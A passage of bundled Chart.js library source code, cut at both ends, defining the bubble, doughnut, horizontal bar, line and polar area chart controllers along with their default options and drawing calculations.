          ? value.max - value.min
          : value.min - value.max;
      var ilen = metasets.length;
      var i, imeta, ivalue, base, head, size, stackLength;

      if (stacked || (stacked === undefined && stack !== undefined)) {
        for (i = 0; i < ilen; ++i) {
          imeta = metasets[i];

          if (imeta.index === datasetIndex) {
            break;
          }

          if (imeta.stack === stack) {
            stackLength = scale._parseValue(datasets[imeta.index].data[index]);
            ivalue =
              stackLength.start === undefined
                ? stackLength.end
                : stackLength.min >= 0 && stackLength.max >= 0
                ? stackLength.max
                : stackLength.min;

            if (
              (value.min < 0 && ivalue < 0) ||
              (value.max >= 0 && ivalue > 0)
            ) {
              start += ivalue;
            }
          }
        }
      }

      base = scale.getPixelForValue(start);
      head = scale.getPixelForValue(start + length);
      size = head - base;

      if (minBarLength !== undefined && Math.abs(size) < minBarLength) {
        size = minBarLength;
        if ((length >= 0 && !isHorizontal) || (length < 0 && isHorizontal)) {
          head = base - minBarLength;
        } else {
          head = base + minBarLength;
        }
      }

      return {
        size: size,
        base: base,
        head: head,
        center: head + size / 2,
      };
    },

    /**
     * @private
     */
    calculateBarIndexPixels: function (datasetIndex, index, ruler, options) {
      var me = this;
      var range =
        options.barThickness === "flex"
          ? computeFlexCategoryTraits(index, ruler, options)
          : computeFitCategoryTraits(index, ruler, options);

      var stackIndex = me.getStackIndex(datasetIndex, me.getMeta().stack);
      var center = range.start + range.chunk * stackIndex + range.chunk / 2;
      var size = Math.min(
        valueOrDefault$3(options.maxBarThickness, Infinity),
        range.chunk * range.ratio
      );

      return {
        base: center - size / 2,
        head: center + size / 2,
        center: center,
        size: size,
      };
    },

    draw: function () {
      var me = this;
      var chart = me.chart;
      var scale = me._getValueScale();
      var rects = me.getMeta().data;
      var dataset = me.getDataset();
      var ilen = rects.length;
      var i = 0;

      helpers$1.canvas.clipArea(chart.ctx, chart.chartArea);

      for (; i < ilen; ++i) {
        var val = scale._parseValue(dataset.data[i]);
        if (!isNaN(val.min) && !isNaN(val.max)) {
          rects[i].draw();
        }
      }

      helpers$1.canvas.unclipArea(chart.ctx);
    },

    /**
     * @private
     */
    _resolveDataElementOptions: function () {
      var me = this;
      var values = helpers$1.extend(
        {},
        core_datasetController.prototype._resolveDataElementOptions.apply(
          me,
          arguments
        )
      );
      var indexOpts = me._getIndexScale().options;
      var valueOpts = me._getValueScale().options;

      values.barPercentage = valueOrDefault$3(
        indexOpts.barPercentage,
        values.barPercentage
      );
      values.barThickness = valueOrDefault$3(
        indexOpts.barThickness,
        values.barThickness
      );
      values.categoryPercentage = valueOrDefault$3(
        indexOpts.categoryPercentage,
        values.categoryPercentage
      );
      values.maxBarThickness = valueOrDefault$3(
        indexOpts.maxBarThickness,
        values.maxBarThickness
      );
      values.minBarLength = valueOrDefault$3(
        valueOpts.minBarLength,
        values.minBarLength
      );

      return values;
    },
  });

  var valueOrDefault$4 = helpers$1.valueOrDefault;
  var resolve$1 = helpers$1.options.resolve;

  core_defaults._set("bubble", {
    hover: {
      mode: "single",
    },

    scales: {
      xAxes: [
        {
          type: "linear", // bubble should probably use a linear scale by default
          position: "bottom",
          id: "x-axis-0", // need an ID so datasets can reference the scale
        },
      ],
      yAxes: [
        {
          type: "linear",
          position: "left",
          id: "y-axis-0",
        },
      ],
    },

    tooltips: {
      callbacks: {
        title: function () {
          // Title doesn't make sense for scatter since we format the data as a point
          return "";
        },
        label: function (item, data) {
          var datasetLabel = data.datasets[item.datasetIndex].label || "";
          var dataPoint = data.datasets[item.datasetIndex].data[item.index];
          return (
            datasetLabel +
            ": (" +
            item.xLabel +
            ", " +
            item.yLabel +
            ", " +
            dataPoint.r +
            ")"
          );
        },
      },
    },
  });

  var controller_bubble = core_datasetController.extend({
    /**
     * @protected
     */
    dataElementType: elements.Point,

    /**
     * @private
     */
    _dataElementOptions: [
      "backgroundColor",
      "borderColor",
      "borderWidth",
      "hoverBackgroundColor",
      "hoverBorderColor",
      "hoverBorderWidth",
      "hoverRadius",
      "hitRadius",
      "pointStyle",
      "rotation",
    ],

    /**
     * @protected
     */
    update: function (reset) {
      var me = this;
      var meta = me.getMeta();
      var points = meta.data;

      // Update Points
      helpers$1.each(points, function (point, index) {
        me.updateElement(point, index, reset);
      });
    },

    /**
     * @protected
     */
    updateElement: function (point, index, reset) {
      var me = this;
      var meta = me.getMeta();
      var custom = point.custom || {};
      var xScale = me.getScaleForId(meta.xAxisID);
      var yScale = me.getScaleForId(meta.yAxisID);
      var options = me._resolveDataElementOptions(point, index);
      var data = me.getDataset().data[index];
      var dsIndex = me.index;

      var x = reset
        ? xScale.getPixelForDecimal(0.5)
        : xScale.getPixelForValue(
            typeof data === "object" ? data : NaN,
            index,
            dsIndex
          );
      var y = reset
        ? yScale.getBasePixel()
        : yScale.getPixelForValue(data, index, dsIndex);

      point._xScale = xScale;
      point._yScale = yScale;
      point._options = options;
      point._datasetIndex = dsIndex;
      point._index = index;
      point._model = {
        backgroundColor: options.backgroundColor,
        borderColor: options.borderColor,
        borderWidth: options.borderWidth,
        hitRadius: options.hitRadius,
        pointStyle: options.pointStyle,
        rotation: options.rotation,
        radius: reset ? 0 : options.radius,
        skip: custom.skip || isNaN(x) || isNaN(y),
        x: x,
        y: y,
      };

      point.pivot();
    },

    /**
     * @protected
     */
    setHoverStyle: function (point) {
      var model = point._model;
      var options = point._options;
      var getHoverColor = helpers$1.getHoverColor;

      point.$previousStyle = {
        backgroundColor: model.backgroundColor,
        borderColor: model.borderColor,
        borderWidth: model.borderWidth,
        radius: model.radius,
      };

      model.backgroundColor = valueOrDefault$4(
        options.hoverBackgroundColor,
        getHoverColor(options.backgroundColor)
      );
      model.borderColor = valueOrDefault$4(
        options.hoverBorderColor,
        getHoverColor(options.borderColor)
      );
      model.borderWidth = valueOrDefault$4(
        options.hoverBorderWidth,
        options.borderWidth
      );
      model.radius = options.radius + options.hoverRadius;
    },

    /**
     * @private
     */
    _resolveDataElementOptions: function (point, index) {
      var me = this;
      var chart = me.chart;
      var dataset = me.getDataset();
      var custom = point.custom || {};
      var data = dataset.data[index] || {};
      var values =
        core_datasetController.prototype._resolveDataElementOptions.apply(
          me,
          arguments
        );

      // Scriptable options
      var context = {
        chart: chart,
        dataIndex: index,
        dataset: dataset,
        datasetIndex: me.index,
      };

      // In case values were cached (and thus frozen), we need to clone the values
      if (me._cachedDataOpts === values) {
        values = helpers$1.extend({}, values);
      }

      // Custom radius resolution
      values.radius = resolve$1(
        [
          custom.radius,
          data.r,
          me._config.radius,
          chart.options.elements.point.radius,
        ],
        context,
        index
      );

      return values;
    },
  });

  var valueOrDefault$5 = helpers$1.valueOrDefault;

  var PI$1 = Math.PI;
  var DOUBLE_PI$1 = PI$1 * 2;
  var HALF_PI$1 = PI$1 / 2;

  core_defaults._set("doughnut", {
    animation: {
      // Boolean - Whether we animate the rotation of the Doughnut
      animateRotate: true,
      // Boolean - Whether we animate scaling the Doughnut from the centre
      animateScale: false,
    },
    hover: {
      mode: "single",
    },
    legendCallback: function (chart) {
      var list = document.createElement("ul");
      var data = chart.data;
      var datasets = data.datasets;
      var labels = data.labels;
      var i, ilen, listItem, listItemSpan;

      list.setAttribute("class", chart.id + "-legend");
      if (datasets.length) {
        for (i = 0, ilen = datasets[0].data.length; i < ilen; ++i) {
          listItem = list.appendChild(document.createElement("li"));
          listItemSpan = listItem.appendChild(document.createElement("span"));
          listItemSpan.style.backgroundColor = datasets[0].backgroundColor[i];
          if (labels[i]) {
            listItem.appendChild(document.createTextNode(labels[i]));
          }
        }
      }

      return list.outerHTML;
    },
    legend: {
      labels: {
        generateLabels: function (chart) {
          var data = chart.data;
          if (data.labels.length && data.datasets.length) {
            return data.labels.map(function (label, i) {
              var meta = chart.getDatasetMeta(0);
              var style = meta.controller.getStyle(i);

              return {
                text: label,
                fillStyle: style.backgroundColor,
                strokeStyle: style.borderColor,
                lineWidth: style.borderWidth,
                hidden: isNaN(data.datasets[0].data[i]) || meta.data[i].hidden,

                // Extra data used for toggling the correct item
                index: i,
              };
            });
          }
          return [];
        },
      },

      onClick: function (e, legendItem) {
        var index = legendItem.index;
        var chart = this.chart;
        var i, ilen, meta;

        for (i = 0, ilen = (chart.data.datasets || []).length; i < ilen; ++i) {
          meta = chart.getDatasetMeta(i);
          // toggle visibility of index if exists
          if (meta.data[index]) {
            meta.data[index].hidden = !meta.data[index].hidden;
          }
        }

        chart.update();
      },
    },

    // The percentage of the chart that we cut out of the middle.
    cutoutPercentage: 50,

    // The rotation of the chart, where the first data arc begins.
    rotation: -HALF_PI$1,

    // The total circumference of the chart.
    circumference: DOUBLE_PI$1,

    // Need to override these to give a nice default
    tooltips: {
      callbacks: {
        title: function () {
          return "";
        },
        label: function (tooltipItem, data) {
          var dataLabel = data.labels[tooltipItem.index];
          var value =
            ": " +
            data.datasets[tooltipItem.datasetIndex].data[tooltipItem.index];

          if (helpers$1.isArray(dataLabel)) {
            // show value on first line of multiline label
            // need to clone because we are changing the value
            dataLabel = dataLabel.slice();
            dataLabel[0] += value;
          } else {
            dataLabel += value;
          }

          return dataLabel;
        },
      },
    },
  });

  var controller_doughnut = core_datasetController.extend({
    dataElementType: elements.Arc,

    linkScales: helpers$1.noop,

    /**
     * @private
     */
    _dataElementOptions: [
      "backgroundColor",
      "borderColor",
      "borderWidth",
      "borderAlign",
      "hoverBackgroundColor",
      "hoverBorderColor",
      "hoverBorderWidth",
    ],

    // Get index of the dataset in relation to the visible datasets. This allows determining the inner and outer radius correctly
    getRingIndex: function (datasetIndex) {
      var ringIndex = 0;

      for (var j = 0; j < datasetIndex; ++j) {
        if (this.chart.isDatasetVisible(j)) {
          ++ringIndex;
        }
      }

      return ringIndex;
    },

    update: function (reset) {
      var me = this;
      var chart = me.chart;
      var chartArea = chart.chartArea;
      var opts = chart.options;
      var ratioX = 1;
      var ratioY = 1;
      var offsetX = 0;
      var offsetY = 0;
      var meta = me.getMeta();
      var arcs = meta.data;
      var cutout = opts.cutoutPercentage / 100 || 0;
      var circumference = opts.circumference;
      var chartWeight = me._getRingWeight(me.index);
      var maxWidth, maxHeight, i, ilen;

      // If the chart's circumference isn't a full circle, calculate size as a ratio of the width/height of the arc
      if (circumference < DOUBLE_PI$1) {
        var startAngle = opts.rotation % DOUBLE_PI$1;
        startAngle +=
          startAngle >= PI$1
            ? -DOUBLE_PI$1
            : startAngle < -PI$1
            ? DOUBLE_PI$1
            : 0;
        var endAngle = startAngle + circumference;
        var startX = Math.cos(startAngle);
        var startY = Math.sin(startAngle);
        var endX = Math.cos(endAngle);
        var endY = Math.sin(endAngle);
        var contains0 =
          (startAngle <= 0 && endAngle >= 0) || endAngle >= DOUBLE_PI$1;
        var contains90 =
          (startAngle <= HALF_PI$1 && endAngle >= HALF_PI$1) ||
          endAngle >= DOUBLE_PI$1 + HALF_PI$1;
        var contains180 = startAngle === -PI$1 || endAngle >= PI$1;
        var contains270 =
          (startAngle <= -HALF_PI$1 && endAngle >= -HALF_PI$1) ||
          endAngle >= PI$1 + HALF_PI$1;
        var minX = contains180
          ? -1
          : Math.min(startX, startX * cutout, endX, endX * cutout);
        var minY = contains270
          ? -1
          : Math.min(startY, startY * cutout, endY, endY * cutout);
        var maxX = contains0
          ? 1
          : Math.max(startX, startX * cutout, endX, endX * cutout);
        var maxY = contains90
          ? 1
          : Math.max(startY, startY * cutout, endY, endY * cutout);
        ratioX = (maxX - minX) / 2;
        ratioY = (maxY - minY) / 2;
        offsetX = -(maxX + minX) / 2;
        offsetY = -(maxY + minY) / 2;
      }

      for (i = 0, ilen = arcs.length; i < ilen; ++i) {
        arcs[i]._options = me._resolveDataElementOptions(arcs[i], i);
      }

      chart.borderWidth = me.getMaxBorderWidth();
      maxWidth =
        (chartArea.right - chartArea.left - chart.borderWidth) / ratioX;
      maxHeight =
        (chartArea.bottom - chartArea.top - chart.borderWidth) / ratioY;
      chart.outerRadius = Math.max(Math.min(maxWidth, maxHeight) / 2, 0);
      chart.innerRadius = Math.max(chart.outerRadius * cutout, 0);
      chart.radiusLength =
        (chart.outerRadius - chart.innerRadius) /
        (me._getVisibleDatasetWeightTotal() || 1);
      chart.offsetX = offsetX * chart.outerRadius;
      chart.offsetY = offsetY * chart.outerRadius;

      meta.total = me.calculateTotal();

      me.outerRadius =
        chart.outerRadius -
        chart.radiusLength * me._getRingWeightOffset(me.index);
      me.innerRadius = Math.max(
        me.outerRadius - chart.radiusLength * chartWeight,
        0
      );

      for (i = 0, ilen = arcs.length; i < ilen; ++i) {
        me.updateElement(arcs[i], i, reset);
      }
    },

    updateElement: function (arc, index, reset) {
      var me = this;
      var chart = me.chart;
      var chartArea = chart.chartArea;
      var opts = chart.options;
      var animationOpts = opts.animation;
      var centerX = (chartArea.left + chartArea.right) / 2;
      var centerY = (chartArea.top + chartArea.bottom) / 2;
      var startAngle = opts.rotation; // non reset case handled later
      var endAngle = opts.rotation; // non reset case handled later
      var dataset = me.getDataset();
      var circumference =
        reset && animationOpts.animateRotate
          ? 0
          : arc.hidden
          ? 0
          : me.calculateCircumference(dataset.data[index]) *
            (opts.circumference / DOUBLE_PI$1);
      var innerRadius =
        reset && animationOpts.animateScale ? 0 : me.innerRadius;
      var outerRadius =
        reset && animationOpts.animateScale ? 0 : me.outerRadius;
      var options = arc._options || {};

      helpers$1.extend(arc, {
        // Utility
        _datasetIndex: me.index,
        _index: index,

        // Desired view properties
        _model: {
          backgroundColor: options.backgroundColor,
          borderColor: options.borderColor,
          borderWidth: options.borderWidth,
          borderAlign: options.borderAlign,
          x: centerX + chart.offsetX,
          y: centerY + chart.offsetY,
          startAngle: startAngle,
          endAngle: endAngle,
          circumference: circumference,
          outerRadius: outerRadius,
          innerRadius: innerRadius,
          label: helpers$1.valueAtIndexOrDefault(
            dataset.label,
            index,
            chart.data.labels[index]
          ),
        },
      });

      var model = arc._model;

      // Set correct angles if not resetting
      if (!reset || !animationOpts.animateRotate) {
        if (index === 0) {
          model.startAngle = opts.rotation;
        } else {
          model.startAngle = me.getMeta().data[index - 1]._model.endAngle;
        }

        model.endAngle = model.startAngle + model.circumference;
      }

      arc.pivot();
    },

    calculateTotal: function () {
      var dataset = this.getDataset();
      var meta = this.getMeta();
      var total = 0;
      var value;

      helpers$1.each(meta.data, function (element, index) {
        value = dataset.data[index];
        if (!isNaN(value) && !element.hidden) {
          total += Math.abs(value);
        }
      });

      /* if (total === 0) {
        total = NaN;
      }*/

      return total;
    },

    calculateCircumference: function (value) {
      var total = this.getMeta().total;
      if (total > 0 && !isNaN(value)) {
        return DOUBLE_PI$1 * (Math.abs(value) / total);
      }
      return 0;
    },

    // gets the max border or hover width to properly scale pie charts
    getMaxBorderWidth: function (arcs) {
      var me = this;
      var max = 0;
      var chart = me.chart;
      var i, ilen, meta, arc, controller, options, borderWidth, hoverWidth;

      if (!arcs) {
        // Find the outmost visible dataset
        for (i = 0, ilen = chart.data.datasets.length; i < ilen; ++i) {
          if (chart.isDatasetVisible(i)) {
            meta = chart.getDatasetMeta(i);
            arcs = meta.data;
            if (i !== me.index) {
              controller = meta.controller;
            }
            break;
          }
        }
      }

      if (!arcs) {
        return 0;
      }

      for (i = 0, ilen = arcs.length; i < ilen; ++i) {
        arc = arcs[i];
        if (controller) {
          controller._configure();
          options = controller._resolveDataElementOptions(arc, i);
        } else {
          options = arc._options;
        }
        if (options.borderAlign !== "inner") {
          borderWidth = options.borderWidth;
          hoverWidth = options.hoverBorderWidth;

          max = borderWidth > max ? borderWidth : max;
          max = hoverWidth > max ? hoverWidth : max;
        }
      }
      return max;
    },

    /**
     * @protected
     */
    setHoverStyle: function (arc) {
      var model = arc._model;
      var options = arc._options;
      var getHoverColor = helpers$1.getHoverColor;

      arc.$previousStyle = {
        backgroundColor: model.backgroundColor,
        borderColor: model.borderColor,
        borderWidth: model.borderWidth,
      };

      model.backgroundColor = valueOrDefault$5(
        options.hoverBackgroundColor,
        getHoverColor(options.backgroundColor)
      );
      model.borderColor = valueOrDefault$5(
        options.hoverBorderColor,
        getHoverColor(options.borderColor)
      );
      model.borderWidth = valueOrDefault$5(
        options.hoverBorderWidth,
        options.borderWidth
      );
    },

    /**
     * Get radius length offset of the dataset in relation to the visible datasets weights. This allows determining the inner and outer radius correctly
     * @private
     */
    _getRingWeightOffset: function (datasetIndex) {
      var ringWeightOffset = 0;

      for (var i = 0; i < datasetIndex; ++i) {
        if (this.chart.isDatasetVisible(i)) {
          ringWeightOffset += this._getRingWeight(i);
        }
      }

      return ringWeightOffset;
    },

    /**
     * @private
     */
    _getRingWeight: function (dataSetIndex) {
      return Math.max(
        valueOrDefault$5(this.chart.data.datasets[dataSetIndex].weight, 1),
        0
      );
    },

    /**
     * Returns the sum of all visibile data set weights.  This value can be 0.
     * @private
     */
    _getVisibleDatasetWeightTotal: function () {
      return this._getRingWeightOffset(this.chart.data.datasets.length);
    },
  });

  core_defaults._set("horizontalBar", {
    hover: {
      mode: "index",
      axis: "y",
    },

    scales: {
      xAxes: [
        {
          type: "linear",
          position: "bottom",
        },
      ],

      yAxes: [
        {
          type: "category",
          position: "left",
          offset: true,
          gridLines: {
            offsetGridLines: true,
          },
        },
      ],
    },

    elements: {
      rectangle: {
        borderSkipped: "left",
      },
    },

    tooltips: {
      mode: "index",
      axis: "y",
    },
  });

  core_defaults._set("global", {
    datasets: {
      horizontalBar: {
        categoryPercentage: 0.8,
        barPercentage: 0.9,
      },
    },
  });

  var controller_horizontalBar = controller_bar.extend({
    /**
     * @private
     */
    _getValueScaleId: function () {
      return this.getMeta().xAxisID;
    },

    /**
     * @private
     */
    _getIndexScaleId: function () {
      return this.getMeta().yAxisID;
    },
  });

  var valueOrDefault$6 = helpers$1.valueOrDefault;
  var resolve$2 = helpers$1.options.resolve;
  var isPointInArea = helpers$1.canvas._isPointInArea;

  core_defaults._set("line", {
    showLines: true,
    spanGaps: false,

    hover: {
      mode: "label",
    },

    scales: {
      xAxes: [
        {
          type: "category",
          id: "x-axis-0",
        },
      ],
      yAxes: [
        {
          type: "linear",
          id: "y-axis-0",
        },
      ],
    },
  });

  function scaleClip(scale, halfBorderWidth) {
    var tickOpts = (scale && scale.options.ticks) || {};
    var reverse = tickOpts.reverse;
    var min = tickOpts.min === undefined ? halfBorderWidth : 0;
    var max = tickOpts.max === undefined ? halfBorderWidth : 0;
    return {
      start: reverse ? max : min,
      end: reverse ? min : max,
    };
  }

  function defaultClip(xScale, yScale, borderWidth) {
    var halfBorderWidth = borderWidth / 2;
    var x = scaleClip(xScale, halfBorderWidth);
    var y = scaleClip(yScale, halfBorderWidth);

    return {
      top: y.end,
      right: x.end,
      bottom: y.start,
      left: x.start,
    };
  }

  function toClip(value) {
    var t, r, b, l;

    if (helpers$1.isObject(value)) {
      t = value.top;
      r = value.right;
      b = value.bottom;
      l = value.left;
    } else {
      t = r = b = l = value;
    }

    return {
      top: t,
      right: r,
      bottom: b,
      left: l,
    };
  }

  var controller_line = core_datasetController.extend({
    datasetElementType: elements.Line,

    dataElementType: elements.Point,

    /**
     * @private
     */
    _datasetElementOptions: [
      "backgroundColor",
      "borderCapStyle",
      "borderColor",
      "borderDash",
      "borderDashOffset",
      "borderJoinStyle",
      "borderWidth",
      "cubicInterpolationMode",
      "fill",
    ],

    /**
     * @private
     */
    _dataElementOptions: {
      backgroundColor: "pointBackgroundColor",
      borderColor: "pointBorderColor",
      borderWidth: "pointBorderWidth",
      hitRadius: "pointHitRadius",
      hoverBackgroundColor: "pointHoverBackgroundColor",
      hoverBorderColor: "pointHoverBorderColor",
      hoverBorderWidth: "pointHoverBorderWidth",
      hoverRadius: "pointHoverRadius",
      pointStyle: "pointStyle",
      radius: "pointRadius",
      rotation: "pointRotation",
    },

    update: function (reset) {
      var me = this;
      var meta = me.getMeta();
      var line = meta.dataset;
      var points = meta.data || [];
      var options = me.chart.options;
      var config = me._config;
      var showLine = (me._showLine = valueOrDefault$6(
        config.showLine,
        options.showLines
      ));
      var i, ilen;

      me._xScale = me.getScaleForId(meta.xAxisID);
      me._yScale = me.getScaleForId(meta.yAxisID);

      // Update Line
      if (showLine) {
        // Compatibility: If the properties are defined with only the old name, use those values
        if (config.tension !== undefined && config.lineTension === undefined) {
          config.lineTension = config.tension;
        }

        // Utility
        line._scale = me._yScale;
        line._datasetIndex = me.index;
        // Data
        line._children = points;
        // Model
        line._model = me._resolveDatasetElementOptions(line);

        line.pivot();
      }

      // Update Points
      for (i = 0, ilen = points.length; i < ilen; ++i) {
        me.updateElement(points[i], i, reset);
      }

      if (showLine && line._model.tension !== 0) {
        me.updateBezierControlPoints();
      }

      // Now pivot the point for animation
      for (i = 0, ilen = points.length; i < ilen; ++i) {
        points[i].pivot();
      }
    },

    updateElement: function (point, index, reset) {
      var me = this;
      var meta = me.getMeta();
      var custom = point.custom || {};
      var dataset = me.getDataset();
      var datasetIndex = me.index;
      var value = dataset.data[index];
      var xScale = me._xScale;
      var yScale = me._yScale;
      var lineModel = meta.dataset._model;
      var x, y;

      var options = me._resolveDataElementOptions(point, index);

      x = xScale.getPixelForValue(
        typeof value === "object" ? value : NaN,
        index,
        datasetIndex
      );
      y = reset
        ? yScale.getBasePixel()
        : me.calculatePointY(value, index, datasetIndex);

      // Utility
      point._xScale = xScale;
      point._yScale = yScale;
      point._options = options;
      point._datasetIndex = datasetIndex;
      point._index = index;

      // Desired view properties
      point._model = {
        x: x,
        y: y,
        skip: custom.skip || isNaN(x) || isNaN(y),
        // Appearance
        radius: options.radius,
        pointStyle: options.pointStyle,
        rotation: options.rotation,
        backgroundColor: options.backgroundColor,
        borderColor: options.borderColor,
        borderWidth: options.borderWidth,
        tension: valueOrDefault$6(
          custom.tension,
          lineModel ? lineModel.tension : 0
        ),
        steppedLine: lineModel ? lineModel.steppedLine : false,
        // Tooltip
        hitRadius: options.hitRadius,
      };
    },

    /**
     * @private
     */
    _resolveDatasetElementOptions: function (element) {
      var me = this;
      var config = me._config;
      var custom = element.custom || {};
      var options = me.chart.options;
      var lineOptions = options.elements.line;
      var values =
        core_datasetController.prototype._resolveDatasetElementOptions.apply(
          me,
          arguments
        );

      // The default behavior of lines is to break at null values, according
      // to https://github.com/chartjs/Chart.js/issues/2435#issuecomment-216718158
      // This option gives lines the ability to span gaps
      values.spanGaps = valueOrDefault$6(config.spanGaps, options.spanGaps);
      values.tension = valueOrDefault$6(
        config.lineTension,
        lineOptions.tension
      );
      values.steppedLine = resolve$2([
        custom.steppedLine,
        config.steppedLine,
        lineOptions.stepped,
      ]);
      values.clip = toClip(
        valueOrDefault$6(
          config.clip,
          defaultClip(me._xScale, me._yScale, values.borderWidth)
        )
      );

      return values;
    },

    calculatePointY: function (value, index, datasetIndex) {
      var me = this;
      var chart = me.chart;
      var yScale = me._yScale;
      var sumPos = 0;
      var sumNeg = 0;
      var i, ds, dsMeta, stackedRightValue, rightValue, metasets, ilen;

      if (yScale.options.stacked) {
        rightValue = +yScale.getRightValue(value);
        metasets = chart._getSortedVisibleDatasetMetas();
        ilen = metasets.length;

        for (i = 0; i < ilen; ++i) {
          dsMeta = metasets[i];
          if (dsMeta.index === datasetIndex) {
            break;
          }

          ds = chart.data.datasets[dsMeta.index];
          if (dsMeta.type === "line" && dsMeta.yAxisID === yScale.id) {
            stackedRightValue = +yScale.getRightValue(ds.data[index]);
            if (stackedRightValue < 0) {
              sumNeg += stackedRightValue || 0;
            } else {
              sumPos += stackedRightValue || 0;
            }
          }
        }

        if (rightValue < 0) {
          return yScale.getPixelForValue(sumNeg + rightValue);
        }
        return yScale.getPixelForValue(sumPos + rightValue);
      }
      return yScale.getPixelForValue(value);
    },

    updateBezierControlPoints: function () {
      var me = this;
      var chart = me.chart;
      var meta = me.getMeta();
      var lineModel = meta.dataset._model;
      var area = chart.chartArea;
      var points = meta.data || [];
      var i, ilen, model, controlPoints;

      // Only consider points that are drawn in case the spanGaps option is used
      if (lineModel.spanGaps) {
        points = points.filter(function (pt) {
          return !pt._model.skip;
        });
      }

      function capControlPoint(pt, min, max) {
        return Math.max(Math.min(pt, max), min);
      }

      if (lineModel.cubicInterpolationMode === "monotone") {
        helpers$1.splineCurveMonotone(points);
      } else {
        for (i = 0, ilen = points.length; i < ilen; ++i) {
          model = points[i]._model;
          controlPoints = helpers$1.splineCurve(
            helpers$1.previousItem(points, i)._model,
            model,
            helpers$1.nextItem(points, i)._model,
            lineModel.tension
          );
          model.controlPointPreviousX = controlPoints.previous.x;
          model.controlPointPreviousY = controlPoints.previous.y;
          model.controlPointNextX = controlPoints.next.x;
          model.controlPointNextY = controlPoints.next.y;
        }
      }

      if (chart.options.elements.line.capBezierPoints) {
        for (i = 0, ilen = points.length; i < ilen; ++i) {
          model = points[i]._model;
          if (isPointInArea(model, area)) {
            if (i > 0 && isPointInArea(points[i - 1]._model, area)) {
              model.controlPointPreviousX = capControlPoint(
                model.controlPointPreviousX,
                area.left,
                area.right
              );
              model.controlPointPreviousY = capControlPoint(
                model.controlPointPreviousY,
                area.top,
                area.bottom
              );
            }
            if (
              i < points.length - 1 &&
              isPointInArea(points[i + 1]._model, area)
            ) {
              model.controlPointNextX = capControlPoint(
                model.controlPointNextX,
                area.left,
                area.right
              );
              model.controlPointNextY = capControlPoint(
                model.controlPointNextY,
                area.top,
                area.bottom
              );
            }
          }
        }
      }
    },

    draw: function () {
      var me = this;
      var chart = me.chart;
      var meta = me.getMeta();
      var points = meta.data || [];
      var area = chart.chartArea;
      var canvas = chart.canvas;
      var i = 0;
      var ilen = points.length;
      var clip;

      if (me._showLine) {
        clip = meta.dataset._model.clip;

        helpers$1.canvas.clipArea(chart.ctx, {
          left: clip.left === false ? 0 : area.left - clip.left,
          right: clip.right === false ? canvas.width : area.right + clip.right,
          top: clip.top === false ? 0 : area.top - clip.top,
          bottom:
            clip.bottom === false ? canvas.height : area.bottom + clip.bottom,
        });

        meta.dataset.draw();

        helpers$1.canvas.unclipArea(chart.ctx);
      }

      // Draw the points
      for (; i < ilen; ++i) {
        points[i].draw(area);
      }
    },

    /**
     * @protected
     */
    setHoverStyle: function (point) {
      var model = point._model;
      var options = point._options;
      var getHoverColor = helpers$1.getHoverColor;

      point.$previousStyle = {
        backgroundColor: model.backgroundColor,
        borderColor: model.borderColor,
        borderWidth: model.borderWidth,
        radius: model.radius,
      };

      model.backgroundColor = valueOrDefault$6(
        options.hoverBackgroundColor,
        getHoverColor(options.backgroundColor)
      );
      model.borderColor = valueOrDefault$6(
        options.hoverBorderColor,
        getHoverColor(options.borderColor)
      );
      model.borderWidth = valueOrDefault$6(
        options.hoverBorderWidth,
        options.borderWidth
      );
      model.radius = valueOrDefault$6(options.hoverRadius, options.radius);
    },
  });

  var resolve$3 = helpers$1.options.resolve;

  core_defaults._set("polarArea", {
    scale: {
      type: "radialLinear",
      angleLines: {
        display: false,
      },
      gridLines: {
        circular: true,
      },
      pointLabels: {
        display: false,
      },
      ticks: {
        beginAtZero: true,
      },
    },

    // Boolean - Whether to animate the rotation of the chart
    animation: {
      animateRotate: true,
      animateScale: true,
    },

    startAngle: -0.5 * Math.PI,
    legendCallback: function (chart) {
      var list = document.createElement("ul");
      var data = chart.data;
      var datasets = data.datasets;
      var labels = data.labels;
      var i, ilen, listItem, listItemSpan;

      list.setAttribute("class", chart.id + "-legend");
      if (datasets.length) {
        for (i = 0, ilen = datasets[0].data.length; i < ilen; ++i) {
          listItem = list.appendChild(document.createElement("li"));
          listItemSpan = listItem.appendChild(document.createElement("span"));
          listItemSpan.style.backgroundColor = datasets[0].backgroundColor[i];
          if (labels[i]) {
            listItem.appendChild(document.createTextNode(labels[i]));
          }
        }
      }

      return list.outerHTML;
    },
    legend: {
      labels: {
        generateLabels: function (chart) {
          var data = chart.data;
          if (data.labels.length && data.datasets.length) {
            return data.labels.map(function (label, i) {
              var meta = chart.getDatasetMeta(0);
              var style = meta.controller.getStyle(i);

              return {
                text: label,
                fillStyle: style.backgroundColor,
                strokeStyle: style.borderColor,
                lineWidth: style.borderWidth,
                hidden: isNaN(data.datasets[0].data[i]) || meta.data[i].hidden,

                // Extra data used for toggling the correct item
                index: i,
              };
            });
          }
          return [];
        },
      },

      onClick: function (e, legendItem) {
        var index = legendItem.index;
        var chart = this.chart;
        var i, ilen, meta;

        for (i = 0, ilen = (chart.data.datasets || []).length; i < ilen; ++i) {
          meta = chart.getDatasetMeta(i);
          meta.data[index].hidden = !meta.data[index].hidden;
        }

        chart.update();
      },
    },

    // Need to override these to give a nice default
    tooltips: {
      callbacks: {
        title: function () {
          return "";
        },
        label: function (item, data) {
          return data.labels[item.index] + ": " + item.yLabel;
        },
      },
    },
  });

  var controller_polarArea = core_datasetController.extend({
    dataElementType: elements.Arc,

    linkScales: helpers$1.noop,

    /**
     * @private
     */
    _dataElementOptions: [
      "backgroundColor",
      "borderColor",
      "borderWidth",
      "borderAlign",
      "hoverBackgroundColor",
      "hoverBorderColor",
      "hoverBorderWidth",
    ],

    /**
     * @private
     */
    _getIndexScaleId: function () {
      return this.chart.scale.id;
    },

    /**
     * @private
     */
    _getValueScaleId: function () {
      return this.chart.scale.id;
    },

    update: function (reset) {
      var me = this;
      var dataset = me.getDataset();
      var meta = me.getMeta();
      var start = me.chart.options.startAngle || 0;
      var starts = (me._starts = []);
      var angles = (me._angles = []);
      var arcs = meta.data;
      var i, ilen, angle;

      me._updateRadius();

      meta.count = me.countVisibleElements();

      for (i = 0, ilen = dataset.data.length; i < ilen; i++) {
        starts[i] = start;
        angle = me._computeAngle(i);
        angles[i] = angle;
        start += angle;
      }

      for (i = 0, ilen = arcs.length; i < ilen; ++i) {
        arcs[i]._options = me._resolveDataElementOptions(arcs[i], i);
        me.updateElement(arcs[i], i, reset);
      }
    },

    /**
     * @private
     */
    _updateRadius: function () {
      var me = this;
      var chart = me.chart;
      var chartArea = chart.chartArea;
